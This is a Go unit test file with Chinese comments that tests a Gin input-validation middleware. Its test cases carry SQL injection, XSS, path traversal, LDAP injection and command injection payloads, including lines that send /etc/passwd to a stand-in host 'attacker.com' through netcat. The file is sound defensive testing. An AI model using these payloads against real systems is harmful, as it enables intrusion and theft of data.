package unit

import (
	"bytes"
	"encoding/json"
	"net/http"
	"net/http/httptest"
	"net/url"
	"strings"
	"testing"

	"github.com/cloud-platform/collaborative-dev/shared/middleware"
	"github.com/gin-gonic/gin"
	"github.com/go-playground/validator/v10"
	"github.com/stretchr/testify/assert"
)

func TestInputValidatorMiddleware(t *testing.T) {
	// 设置Gin测试模式
	gin.SetMode(gin.TestMode)

	tests := []struct {
		name           string
		setupRequest   func() *http.Request
		config         *middleware.ValidatorConfig
		expectedStatus int
		expectedError  string
	}{
		// SQL注入测试
		{
			name: "SQL注入 - 路径参数",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/user/admin%27%20OR%20%271%27=%271", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableSQLInjectionProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "SQL注入",
		},
		{
			name: "SQL注入 - 查询参数",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/users?id=1%27%20UNION%20SELECT%20*%20FROM%20users--", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableSQLInjectionProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "SQL注入",
		},
		{
			name: "SQL注入 - 表单数据",
			setupRequest: func() *http.Request {
				form := url.Values{}
				form.Add("username", "admin'; DROP TABLE users;--")
				req := httptest.NewRequest("POST", "/login", strings.NewReader(form.Encode()))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableSQLInjectionProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "SQL注入",
		},
		// XSS攻击测试
		{
			name: "XSS攻击 - Script标签",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/search?q=%3Cscript%3Ealert%28%27xss%27%29%3C/script%3E", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableXSSProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "XSS攻击",
		},
		{
			name: "XSS攻击 - 事件处理器",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/profile?name=%3Cimg%20src=x%20onerror=alert%28%27xss%27%29%3E", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableXSSProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "XSS攻击",
		},
		{
			name: "XSS攻击 - JavaScript协议",
			setupRequest: func() *http.Request {
				form := url.Values{}
				form.Add("link", "javascript:alert('xss')")
				req := httptest.NewRequest("POST", "/update", strings.NewReader(form.Encode()))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableXSSProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "XSS攻击",
		},
		// 路径遍历测试
		{
			name: "路径遍历 - 基本模式",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/file?path=../../etc/passwd", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnablePathTraversalProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "路径遍历",
		},
		{
			name: "路径遍历 - URL编码",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/download?file=%2e%2e%2f%2e%2e%2fetc%2fpasswd", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnablePathTraversalProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "路径遍历",
		},
		// 命令注入测试
		{
			name: "命令注入 - Shell命令",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/exec?cmd=ls;cat /etc/passwd", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableCommandInjectionProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "命令注入",
		},
		{
			name: "命令注入 - 管道符",
			setupRequest: func() *http.Request {
				form := url.Values{}
				form.Add("input", "test | nc attacker.com 1234")
				req := httptest.NewRequest("POST", "/process", strings.NewReader(form.Encode()))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableCommandInjectionProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "命令注入",
		},
		// LDAP注入测试
		{
			name: "LDAP注入 - 过滤器操作",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("GET", "/ldap?user=admin)(objectClass=*", nil)
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableLDAPInjectionProtection: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "LDAP注入",
		},
		// 正常请求测试
		{
			name: "正常请求 - 安全输入",
			setupRequest: func() *http.Request {
				form := url.Values{}
				form.Add("username", "john_doe123")
				form.Add("email", "john@example.com")
				req := httptest.NewRequest("POST", "/register", strings.NewReader(form.Encode()))
				req.Header.Set("Content-Type", "application/x-www-form-urlencoded")
				return req
			},
			config: &middleware.ValidatorConfig{
				EnableSQLInjectionProtection:     true,
				EnableXSSProtection:              true,
				EnablePathTraversalProtection:    true,
				EnableCommandInjectionProtection: true,
				EnableLDAPInjectionProtection:    true,
			},
			expectedStatus: http.StatusOK,
		},
		// 内容类型检查
		{
			name: "不允许的内容类型",
			setupRequest: func() *http.Request {
				req := httptest.NewRequest("POST", "/upload", strings.NewReader("test"))
				req.Header.Set("Content-Type", "application/octet-stream")
				return req
			},
			config: &middleware.ValidatorConfig{
				AllowedContentTypes: []string{"application/json", "application/x-www-form-urlencoded"},
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "不支持的内容类型",
		},
		// 请求大小限制
		{
			name: "请求大小超限",
			setupRequest: func() *http.Request {
				largeBody := strings.Repeat("a", 1024) // 1KB
				req := httptest.NewRequest("POST", "/upload", strings.NewReader(largeBody))
				req.Header.Set("Content-Type", "text/plain")
				req.ContentLength = int64(len(largeBody))
				return req
			},
			config: &middleware.ValidatorConfig{
				MaxRequestSize: 512, // 512 bytes
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "请求大小超过限制",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// 创建路由
			router := gin.New()

			// 配置中间件
			if tt.config.ErrorHandler == nil {
				tt.config.ErrorHandler = func(c *gin.Context, err error) {
					c.JSON(http.StatusBadRequest, gin.H{
						"error": err.Error(),
					})
				}
			}

			// 添加验证中间件
			router.Use(middleware.InputValidationWithConfig(*tt.config))

			// 添加测试路由
			router.Any("/*path", func(c *gin.Context) {
				c.JSON(http.StatusOK, gin.H{"status": "ok"})
			})

			// 执行请求
			w := httptest.NewRecorder()
			router.ServeHTTP(w, tt.setupRequest())

			// 验证结果
			assert.Equal(t, tt.expectedStatus, w.Code)

			if tt.expectedError != "" {
				var response map[string]interface{}
				err := json.Unmarshal(w.Body.Bytes(), &response)
				assert.NoError(t, err)
				assert.Contains(t, response["error"].(string), tt.expectedError)
			}
		})
	}
}

func TestRequestBodyValidator(t *testing.T) {
	gin.SetMode(gin.TestMode)

	tests := []struct {
		name           string
		body           interface{}
		config         *middleware.ValidatorConfig
		expectedStatus int
		expectedError  string
	}{
		// JSON深度验证测试
		{
			name: "SQL注入 - JSON字段",
			body: map[string]interface{}{
				"username": "admin' OR '1'='1",
				"password": "password123",
			},
			config: &middleware.ValidatorConfig{
				EnableSQLInjectionProtection: true,
				EnableDeepJSONValidation:     true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "SQL注入",
		},
		{
			name: "XSS攻击 - 嵌套JSON",
			body: map[string]interface{}{
				"user": map[string]interface{}{
					"name":    "John Doe",
					"profile": "<script>alert('xss')</script>",
				},
			},
			config: &middleware.ValidatorConfig{
				EnableXSSProtection:      true,
				EnableDeepJSONValidation: true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "XSS攻击",
		},
		{
			name: "命令注入 - JSON数组",
			body: map[string]interface{}{
				"commands": []interface{}{
					"ls -la",
					"cat /etc/passwd | nc attacker.com 1234",
				},
			},
			config: &middleware.ValidatorConfig{
				EnableCommandInjectionProtection: true,
				EnableDeepJSONValidation:         true,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "命令注入",
		},
		{
			name: "JSON深度限制",
			body: createDeepJSON(15), // 创建15层深的JSON
			config: &middleware.ValidatorConfig{
				EnableDeepJSONValidation: true,
				MaxJSONDepth:             10,
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "JSON嵌套深度超过限制",
		},
		{
			name: "正常JSON请求",
			body: map[string]interface{}{
				"username": "john_doe",
				"email":    "john@example.com",
				"profile": map[string]interface{}{
					"age":     30,
					"city":    "New York",
					"hobbies": []string{"reading", "coding", "gaming"},
				},
			},
			config: &middleware.ValidatorConfig{
				EnableSQLInjectionProtection:     true,
				EnableXSSProtection:              true,
				EnableCommandInjectionProtection: true,
				EnableDeepJSONValidation:         true,
				MaxJSONDepth:                     10,
			},
			expectedStatus: http.StatusOK,
		},
		{
			name: "混合攻击向量",
			body: map[string]interface{}{
				"query":    "SELECT * FROM users WHERE id=1",
				"template": "<div>{{user}}</div>",
				"path":     "/var/www/html/../../../etc/passwd",
				"command":  "echo 'hello' && ls",
			},
			config: &middleware.ValidatorConfig{
				EnableSQLInjectionProtection:     true,
				EnableXSSProtection:              true,
				EnablePathTraversalProtection:    true,
				EnableCommandInjectionProtection: true,
				EnableDeepJSONValidation:         true,
			},
			expectedStatus: http.StatusBadRequest,
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// 创建路由
			router := gin.New()

			// 配置错误处理
			if tt.config.ErrorHandler == nil {
				tt.config.ErrorHandler = func(c *gin.Context, err error) {
					c.JSON(http.StatusBadRequest, gin.H{
						"error": err.Error(),
					})
				}
			}

			// 添加请求体验证中间件
			router.Use(middleware.RequestBodyValidationWithConfig(*tt.config))

			// 添加测试路由
			router.POST("/test", func(c *gin.Context) {
				var data interface{}
				if err := c.ShouldBindJSON(&data); err != nil {
					c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
					return
				}
				c.JSON(http.StatusOK, gin.H{"status": "ok", "data": data})
			})

			// 准备请求
			bodyBytes, _ := json.Marshal(tt.body)
			req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(bodyBytes))
			req.Header.Set("Content-Type", "application/json")

			// 执行请求
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// 验证结果
			assert.Equal(t, tt.expectedStatus, w.Code)

			if tt.expectedError != "" {
				var response map[string]interface{}
				err := json.Unmarshal(w.Body.Bytes(), &response)
				assert.NoError(t, err)
				assert.Contains(t, response["error"].(string), tt.expectedError)
			}
		})
	}
}

// 辅助函数：创建指定深度的JSON
func createDeepJSON(depth int) map[string]interface{} {
	if depth <= 0 {
		return map[string]interface{}{"value": "leaf"}
	}
	return map[string]interface{}{
		"level": depth,
		"child": createDeepJSON(depth - 1),
	}
}

// 测试自定义验证器
func TestCustomValidators(t *testing.T) {
	gin.SetMode(gin.TestMode)

	// 创建带自定义验证器的配置
	config := middleware.ValidatorConfig{
		EnableSQLInjectionProtection: true,
		EnableXSSProtection:          true,
		CustomValidators: map[string]validator.Func{
			"nospaces": func(fl validator.FieldLevel) bool {
				return !strings.Contains(fl.Field().String(), " ")
			},
		},
	}

	// 定义测试结构体
	type TestRequest struct {
		Username string `json:"username" validate:"required,nospaces,nosqlinjection"`
		Email    string `json:"email" validate:"required,email"`
		Bio      string `json:"bio" validate:"noxss"`
	}

	tests := []struct {
		name           string
		request        TestRequest
		expectedStatus int
		expectedError  string
	}{
		{
			name: "通过所有验证",
			request: TestRequest{
				Username: "john_doe",
				Email:    "john@example.com",
				Bio:      "Software developer",
			},
			expectedStatus: http.StatusOK,
		},
		{
			name: "自定义验证失败 - 包含空格",
			request: TestRequest{
				Username: "john doe",
				Email:    "john@example.com",
				Bio:      "Software developer",
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "nospaces",
		},
		{
			name: "SQL注入验证失败",
			request: TestRequest{
				Username: "admin'--",
				Email:    "admin@example.com",
				Bio:      "Admin user",
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "nosqlinjection",
		},
		{
			name: "XSS验证失败",
			request: TestRequest{
				Username: "john_doe",
				Email:    "john@example.com",
				Bio:      "<script>alert('xss')</script>",
			},
			expectedStatus: http.StatusBadRequest,
			expectedError:  "noxss",
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			// 创建路由
			router := gin.New()

			// 创建验证中间件
			validator := middleware.NewInputValidatorMiddleware(&config)

			// 添加测试路由
			router.POST("/test", func(c *gin.Context) {
				var req TestRequest
				if err := c.ShouldBindJSON(&req); err != nil {
					c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
					return
				}

				// 使用中间件的验证器进行结构体验证
				if err := validator.ValidateStruct(req); err != nil {
					c.JSON(http.StatusBadRequest, gin.H{"error": err.Error()})
					return
				}

				c.JSON(http.StatusOK, gin.H{"status": "ok"})
			})

			// 准备请求
			bodyBytes, _ := json.Marshal(tt.request)
			req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(bodyBytes))
			req.Header.Set("Content-Type", "application/json")

			// 执行请求
			w := httptest.NewRecorder()
			router.ServeHTTP(w, req)

			// 验证结果
			assert.Equal(t, tt.expectedStatus, w.Code)

			if tt.expectedError != "" {
				assert.Contains(t, w.Body.String(), tt.expectedError)
			}
		})
	}
}

// 性能测试
func BenchmarkInputValidation(b *testing.B) {
	gin.SetMode(gin.ReleaseMode)

	router := gin.New()
	router.Use(middleware.InputValidation())
	router.POST("/test", func(c *gin.Context) {
		c.Status(http.StatusOK)
	})

	// 准备测试数据
	testData := map[string]interface{}{
		"username": "john_doe",
		"email":    "john@example.com",
		"profile": map[string]interface{}{
			"bio":      "Software developer",
			"location": "New York",
		},
	}
	bodyBytes, _ := json.Marshal(testData)

	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(bodyBytes))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
	}
}

func BenchmarkDeepJSONValidation(b *testing.B) {
	gin.SetMode(gin.ReleaseMode)

	config := middleware.ValidatorConfig{
		EnableDeepJSONValidation:     true,
		EnableSQLInjectionProtection: true,
		EnableXSSProtection:          true,
		MaxJSONDepth:                 10,
	}

	router := gin.New()
	router.Use(middleware.RequestBodyValidationWithConfig(config))
	router.POST("/test", func(c *gin.Context) {
		c.Status(http.StatusOK)
	})

	// 准备嵌套JSON数据
	testData := createDeepJSON(5)
	bodyBytes, _ := json.Marshal(testData)

	b.ResetTimer()

	for i := 0; i < b.N; i++ {
		req := httptest.NewRequest("POST", "/test", bytes.NewBuffer(bodyBytes))
		req.Header.Set("Content-Type", "application/json")
		w := httptest.NewRecorder()
		router.ServeHTTP(w, req)
	}
}
